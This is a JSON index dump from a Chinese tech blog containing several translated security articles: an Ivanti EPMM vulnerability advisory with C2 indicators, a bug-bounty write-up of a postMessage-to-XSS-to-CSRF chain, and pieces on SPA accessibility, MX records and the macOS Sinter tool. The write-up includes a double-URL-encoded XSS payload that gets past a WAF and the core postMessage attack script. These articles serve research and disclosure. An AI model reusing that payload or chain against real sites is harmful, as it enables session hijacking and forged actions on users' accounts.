AI®——每日可识别和分类900万次威胁的自动化防御引擎。面对人手不足或身兼多职的州IT团队，AI与自动化能显著改善平均检测时间（MTTD）和平均响应时间（MTTR）等关键指标。在Palo Alto Networks的安全运营中心（SOC），MTTR已缩短至检测后一分钟内，确保在威胁升级前快速精准响应。这些成果正是公共机构与私营创新紧密协作的体现。\n云迁移中的安全保障\r随着各州将财务系统到应急服务全面转向\u0026quot;云优先\u0026quot;策略，网络安全必须同步演进。通过FedRAMP和GovRAMP High认证的Prisma® Cloud为多云和混合环境提供从开发到部署的端到端防护。云创新的速度使州机构难以独自确保安全，与可信供应商合作能在保证合规性和敏捷性的同时避免复杂性增加或出现可视性缺口。\n专为州IT需求打造\rPalo Alto Networks的公共部门团队深入理解各州环境的特殊性——从治理约束、采购流程到多机构协作。我们提供定制化解决方案消除低效环节，在全州生态系统中降低风险并提升服务交付能力。团队通过案例研究和行业基准提供可量化的关键绩效指标（KPI），确保解决方案直接对接管理层优先级。\n通过采用统一的AI驱动方案并发挥公私合作优势，州政府能有效保护公民数据、优化成本，构建更具韧性的数字未来。\n美国制造·为政府而生\r总部位于加州的Palo Alto Networks拥有20年网络安全创新领导经验。我们在全美49个州拥有8,800多名员工，硬件防火墙全部在美国德克萨斯州主装配中心生产。每年投入超过18亿美元的研发资金，持续推动美国技术领导力发展。\nPalo Alto Networks已准备好帮助各州IT机构实现网络安全现代化，共同构建更安全、更智能的未来。\n","date":"2025-08-01T21:17:43+08:00","permalink":"http://localhost:1313/p/%E5%B7%9E%E5%92%8C%E5%9C%B0%E6%96%B9%E6%94%BF%E5%BA%9C%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%8E%B0%E4%BB%A3%E5%8C%96%E8%BD%AC%E5%9E%8B/","title":"州和地方政府网络安全现代化转型"},{"content":"单页应用(SPA)无障碍最佳实践\r现代网络用户期望获得快速、流畅的交互体验。单页应用(SPA)通过无需重新加载页面即可实时更新内容的方式满足了这一需求。然而，这种动态特性也给依赖辅助技术的残障用户带来了特殊的可访问性挑战。\nSPA工作原理\r传统网站如同图书馆系统，每次请求新页面都需要服务器处理。而SPA则像随身携带的魔法书车，初始加载后所有内容更新都在后台完成，提供无缝的浏览体验。\nSPA的无障碍挑战\r1. 动态内容更新\rSPA使用JavaScript框架实时更新页面部分内容，但不会自动通知屏幕阅读器。例如购物车商品数量变化时，若未正确实现ARIA实时区域属性，视障用户可能无法获知操作结果。\n代码示例展示了模态窗口的焦点管理问题：\n1 2 3 4 5 6 7 8 9 function openModal() { document.getElementById(\u0026#39;myModal\u0026#39;).style.display = \u0026#39;block\u0026#39;; document.getElementById(\u0026#39;closeModalButton\u0026#39;).focus(); } function closeModal() { document.getElementById(\u0026#39;myModal\u0026#39;).style.display = \u0026#39;none\u0026#39;; } // 关闭模态窗后未恢复焦点会导致键盘用户迷失位置 2. 浏览器历史管理\rSPA通常需要手动处理历史记录：\n1 2 3 4 5 6 7 8 9 10 function changeView(itemId) { const contentView = document.getElementById(\u0026#39;contentView\u0026#39;); fetch(`/api/content/${itemId}`) .then(response =\u0026gt; response.json()) .then(content =\u0026gt; { contentView.innerHTML = content.html; // 必须手动更新历史记录 history.pushState({contentId: itemId}, null, `?content=${itemId}`); }); } 最佳实践方案\r1. ARIA角色与属性\r对自动更新内容使用aria-live=\u0026quot;polite\u0026quot; 为下拉菜单添加aria-expanded状态 使用aria-label提供元素描述 2. 键盘导航优化\r实现模态对话框的焦点陷阱 添加\u0026quot;跳过导航\u0026quot;链接 提供常用操作的键盘快捷键 3. 性能优化策略\r压缩JavaScript/CSS文件 使用WebP等现代图片格式 异步加载非关键脚本 4. 渐进增强原则\r确保核心功能不依赖JavaScript 禁用JS环境下测试关键流程 5. 持续无障碍测试\r集成WAVE、Lighthouse等自动化工具 组织真实辅助技术用户测试 定期使用NVDA/JAWS屏幕阅读器验证 通过实施这些技术方案，开发者可以构建既保持SPA动态特性又符合无障碍标准的现代Web应用。建议进一步参考WCAG标准和ARIA创作实践指南获取完整规范。\n","date":"2025-08-01T21:10:37+08:00","permalink":"http://localhost:1313/p/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8spa%E6%97%A0%E9%9A%9C%E7%A2%8D%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97/","title":"单页应用(SPA)无障碍最佳实践指南"},{"content":"今天，微软宣布Azure Sphere全面上市（GA）。\nAzure Sphere的使命是赋能全球每个组织连接并创建安全可信的物联网设备。它是一个端到端的安全解决方案，既支持安全连接现有设备，也能为新型物联网设备提供内置安全保障。该解决方案涵盖硬件、操作系统和云服务，并通过持续的安全与系统更新确保设备在威胁演变中保持防护。\n创新要产生持久价值，必须建立在安全基础之上。安全研究人员通过协调漏洞披露（CVD）向微软提交漏洞报告，持续为保护数十亿用户发挥着关键作用。随着Azure Sphere的正式发布，我们邀请全球研究人员通过微软Azure赏金计划挖掘其高影响漏洞。符合条件的研究成果最高可获得4万美元奖励。\n若您对物联网安全研究感兴趣，请点击此处注册以获取项目信息。我们期待在未来数月分享更多计划进展！\n了解更多Azure Sphere信息，请访问正式发布公告博客及Azure Sphere官网。\n——Sylvie Liu，微软安全响应中心安全项目经理\n","date":"2025-08-01T21:04:07+08:00","permalink":"http://localhost:1313/p/%E6%AC%A2%E8%BF%8E%E5%8F%82%E4%B8%8Eazure-sphere%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E7%8E%B0%E5%B7%B2%E6%AD%A3%E5%BC%8F%E5%8F%91%E5%B8%83/","title":"欢迎参与Azure Sphere安全研究——现已正式发布"},{"content":"摘要\r3月13日，Ivanti披露了影响其本地部署版Endpoint Manager Mobile产品的两个漏洞：CVE-2025-4427（认证绕过）和CVE-2025-4428（认证后RCE漏洞）。虽然单个漏洞严重性不高（CVSS评分分别为5.3和7.2），但组合利用后可使未认证攻击者在受影响EPMM实例上执行恶意代码。Ivanti确认在初始披露前已发现有限的实际攻击案例，GreyNoise和Wiz等多家机构证实自5月16日起出现大规模攻击活动，这与漏洞验证代码的公开时间基本吻合。\n受影响系统和/或应用\r以下版本的Ivanti Endpoint Manager Mobile：\n11.12.0.4及之前版本 12.3.0.1及之前版本 12.4.0.1及之前版本 12.5.0.0及之前版本 技术细节/攻击概述\rWiz对漏洞技术细节进行了精要总结：\n\u0026ldquo;CVE-2025-4428是EPMM设备功能使用报告查询验证器(DeviceFeatureUsageReportQueryRequestValidator)中的认证后远程代码执行漏洞。该漏洞源于Spring框架的AbstractMessageSource在处理错误消息时对用户输入的不安全处理，导致攻击者可通过EL表达式注入实现任意Java代码执行。精心构造/api/v2/featureusage端点中的format参数即可触发命令注入（如Runtime.exec()）。\nCVE-2025-4427是EPMM路由配置中的认证绕过漏洞。由于Spring Security配置缺少规则，导致/rs/api/v2/featureusage等路由意外暴露。这使得攻击者无需认证即可访问RCE触发点，在与CVE-2025-4428组合后实现完全的预认证RCE。但如watchTowr所指出的，这更准确地说是一个操作顺序缺陷，因为验证器逻辑在认证检查之前执行。\u0026rdquo;\nWiz还分享了从Sliver植入案例中提取的威胁指标：\nIOC 描述 1b1dda5e8e26da568559e0577769697c624df30e Sliver Beacon (SHA1) ac389c8b7f3d2fcf4fd73891f881b12b8343665b Sliver Beacon (SHA1) 79.96.45[.]181 Sliver C2 IP地址 该C2 IP目前仍处于活跃状态，根据共享证书判断，以下服务器可能也由同一攻击者控制：\n185.174.137[.]26 46.41.134[.]8 79.96.45[.]181 elektrobohater[.]pl wagodirect[.]pl e-wago[.]pl 缓解措施\r将EPMM实例升级至以下版本：\n11.12.0.5 12.3.0.2 12.4.0.2 12.5.0.1 在打补丁前，建议限制对受认证绕过影响的端点（/rs/api/v2/* 和 /mifs/rs/api/v2/*）的网络访问。\n网络融合中心采取的措施\rCFC将持续监控事态发展，必要时发布安全通告更新。除IOC检测外，正在研究更多威胁狩猎可能性。订阅漏洞扫描服务的客户将在扫描提供商发布相关插件后立即获得关键漏洞扫描结果。\nQualys ID：530061, 732523\nTenable ID：235860\n参考链接\rhttps://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Endpoint-Manager-Mobile-EPMM https://www.ivanti.com/blog/epmm-security-update https://www.greynoise.io/blog/ivanti-epmm-zero-days-reconnaissance-exploitation https://www.wiz.io/blog/ivanti-epmm-rce-vulnerability-chain-exploited-in-the-wil-cve-2025-4427-cve-2025-4 https://labs.watchtowr.com/expression-payloads-meet-mayhem-cve-2025-4427-and-cve-2025-4428/ ","date":"2025-08-01T20:57:30+08:00","permalink":"http://localhost:1313/p/ivanti-epmm%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88%E5%AE%9E%E7%8E%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB/","title":"Ivanti EPMM漏洞组合实现未授权远程代码执行攻击"},{"content":"TL;DR\r数月前在某公开漏洞赏金项目中，作者发现了一个精妙的漏洞链，包含：\n不安全的message事件监听 粗糙的JSONP端点 WAF绕过技巧 范围外子域的DOM型XSS 过度宽松的CORS配置 这些漏洞最终组合实现了对范围内资产的CSRF攻击。本文将深度剖析这个攻击链的技术细节。\n寻找棘手的CSRF漏洞\r目标赏金项目的范围仅限于www.redacted.com及其少数子域。当常规测试思路枯竭时，作者注意到inscope.redacted.com等子域会向https://www.redacted.com/api发送包含敏感操作（如更新用户资料）的POST请求。这些请求依赖标记为SameSite=None和Secure的sidcookie进行认证，但作为CSRF防护，端点要求查询参数中包含与会话绑定的csrftoken。\n宽松的CORS策略突破范围限制\r测试发现https://www.redacted.com/profile端点的CORS配置不仅允许https://in-scope.redacted.com，还接受任意redacted.com子域的请求：\n1 2 3 4 5 6 $ curl -sD - -o /dev/null \\ -H \u0026#34;Origin: https://whatever.redacted.com\u0026#34; \\ -H \u0026#34;Cookie: sid=xxx-yyy-zzz\u0026#34; \\ https://www.redacted.com/profile HTTP/1.1 200 OK Access-Control-Allow-Origin: https://whatever.redacted.com 范围外子域的不安全消息监听\r使用postMessage-tracker插件发现https://out-of-scope.redacted.com/search存在未做来源检查的message事件监听器，其处理逻辑会：\n解析事件数据为JSON对象 按点号分割method属性 递归访问window.APP对象的嵌套属性 调用最终获得的函数并传入arg参数 粗糙的JSONP端点导致DOM型XSS\rwindow.APP.apiCall函数用于向https://search.redacted.com的JSONP端点发送请求，但存在两个关键问题：\nURL构造不安全 回调参数验证存在缺陷 通过双重URL编码可绕过Akamai WAF防护：\n1 GET https://search.redacted.com/\u0026amp;callback=alert%2528%2527xss%2527%2529%252F%252F\u0026amp;output=jsonp HTTP/2 组合利用实现一键CSRF\r最终攻击流程：\n诱导用户点击恶意页面按钮 弹出窗口打开目标页面 通过postMessage触发JSONP请求 利用XSS窃取CSRF令牌 伪造用户资料更新请求 攻击页面核心代码：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script\u0026gt; function sendMsg() { const doubleEncodedPayload = encode(encode(`${payload}//`)); const msg = { \u0026#39;method\u0026#39;: \u0026#39;APP.apiCall\u0026#39;, \u0026#39;arg\u0026#39;: `\u0026amp;callback=${doubleEncodedPayload}\u0026amp;output=jsonp#` }; win.postMessage(JSON.stringify(msg), url.origin); } \u0026lt;/script\u0026gt; 后续\r虽然漏洞链技术复杂度高（CVSS 7.1 High），但最终仅获得200欧元奖励。这反映出某些赏金项目对复杂攻击链的价值评估可能存在偏差。\n","date":"2025-08-01T20:51:05+08:00","permalink":"http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E9%93%BE%E5%A4%A7%E6%9D%82%E7%83%A9postmessagejsonpwaf%E7%BB%95%E8%BF%87dom%E5%9E%8Bxsscors%E4%B8%8Ecsrf%E7%9A%84%E5%AE%8C%E7%BE%8E%E9%A3%8E%E6%9A%B4/","title":"漏洞链大杂烩：postMessage、JSONP、WAF绕过、DOM型XSS、CORS与CSRF的完美风暴"},{"content":"请勿在DNS MX记录中直接使用IP地址\r我想强调邮件服务器DNS记录中一个常见的错误配置。\n当域名配置接收邮件时，通常需要设置指向邮件服务器主机名的MX类型DNS记录。值得注意的是，根据RFC 1035规范，MX记录必须包含域名而不能直接指向IP地址。但某些邮件服务器仍会错误配置IP地址。多数邮件服务器对此类配置错误较为宽容仍能投递邮件，导致问题难以被发现。\n我使用的邮件服务器（Courier）对此限制较严格，因此时常因此无法发送邮件。虽然发生频率不高，但确实存在。若您的邮件服务器存在此类配置，可能会错过部分合法邮件。\n希望通过本文提高认知并推动修复。具体建议如下：\n邮件/DNS服务器管理员：请严格使用域名配置MX记录 IT服务提供商：应将此检查纳入定期审计清单（附Python检测脚本） 检测工具开发者：建议增加MX记录IP地址检测功能。目前仅Hardenize和IntoDNS等少数服务会警告此类问题。 我对Alexa Top 100万网站进行了快速扫描，约0.06%存在此问题（如果您认识相关责任人，请分享本文）。后续可能通过postmaster别名联系这些域名管理者。\n（图片来源：nohat.cc / CC0协议）\n技术讨论精选\r评论#1 - Erwin Hoffmann\r配置错误实际源于DNS负责人而非邮件服务器 仅IPv4地址可能被误用（语法与域名相似） DNS软件应增加输入验证机制 完整MX配置需包含： 域名 权重值 对应A/AAAA记录 现代互联网还需配置： 反向DNS SPF记录 TLSA记录 评论#2 - Spongebob\r使用IP地址将导致无法配置DKIM/DMARC（MX名称需匹配SSL证书）\n作者回复：此问题实际与MTA-STS相关（需验证主机名证书）\n","date":"2025-07-30T21:00:38+08:00","permalink":"http://localhost:1313/p/%E8%AF%B7%E5%8B%BF%E5%9C%A8dns-mx%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8ip%E5%9C%B0%E5%9D%80-%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97/","title":"请勿在DNS MX记录中直接使用IP地址 - 邮件服务器配置指南"},{"content":"Sinter：macOS全新用户态安全执行框架\r简单、开源且基于Swift\rSinter是我们用Swift编写的开源macOS端点安全执行代理（支持10.15及以上系统）。它完全基于用户态构建，利用新的EndpointSecurity API接收macOS内核发出的安全事件回调。通过简单规则即可控制事件允许/拒绝，无需传统杀毒软件的全盘扫描或特征检测。\n纯用户态安全代理的探索\r实现端点安全解决方案需要实时拦截和授权OS级事件。过去这意味着使用内核态回调API或直接挂钩内核代码。苹果在2019年末宣布将弃用所有第三方内核扩展，引入EndpointSecurity API作为替代方案。\nEndpointSecurity API解析\r该API实现了macOS内核的实时回调机制，支持NOTIFY（通知）和AUTH（授权）两种事件类型。它取代了原有的Kauth KPI等内核态方案，成为macOS 11 Big Sur后唯一合法的实时监控接口。\nSinter开发中的关键技术挑战\r实时决策不影响系统性能\n采用异步处理架构，通过es_copy_message解耦消息处理，建立双优先级队列（常规程序和大程序分离），确保系统响应能力。\n防范TOCTOU竞态条件\n针对\u0026quot;检查时-使用时\u0026quot;时间差攻击，实现文件事件监控机制。当检测到执行文件被篡改时立即清除缓存（已向苹果提交改进建议FB8352031）。\n应用包代码签名验证\nmacOS可执行文件存在于应用包（.app）中，需验证整个包的签名。Sinter创新性地实现双缓存机制：EndpointSecurity原生缓存+自定义应用包验证缓存。\n系统扩展安装优势\n作为System Extension部署可获得系统级保护（包括SIP扩展防护），防止root用户卸载。未来版本将迁移到此模式。\n证书签名与公证流程\n建立自动化CMake工作流处理苹果严格的代码签名、公证和权限申请（EndpointSecurity权限需6周人工审核）。\n未来展望\rSinter将持续增强规则引擎灵活性，整合文件完整性监控、内存注入防护（通过mmap事件分析）及NetworkExtension网络流量控制。我们欢迎社区通过GitHub或Empire Hacking Slack频道参与贡献。\n随着内核扩展的弃用，苹果为端点防护建立了统一用户态API标准，这将提升系统稳定性并减少攻击面，而Swift语言的选择确保了长期兼容性优势。\n","date":"0001-01-01T00:00:00Z","permalink":"http://localhost:1313/p/sintermacos%E5%85%A8%E6%96%B0%E7%94%A8%E6%88%B7%E6%80%81%E5%AE%89%E5%85%A8%E6%89%A7%E8%A1%8C%E6%A1%86%E6%9E%B6%E8%A7%A3%E6%9E%90/","title":"Sinter：macOS全新用户态安全执行框架解析"}]